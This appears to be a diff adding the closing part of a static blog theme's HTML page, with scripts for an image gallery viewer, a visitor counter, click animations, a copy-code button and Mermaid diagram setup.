+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+ 
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+ 
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<script src="https://cdn.staticfile.org/animejs/3.2.1/anime.min.js"></script>
+
+<script src="/js/clickBoom1.js"></script>
+ 
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+ 
+<script src="/js/dz.js"></script>
+ 
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    
+
+  </div>
+</body>
+
+</html>
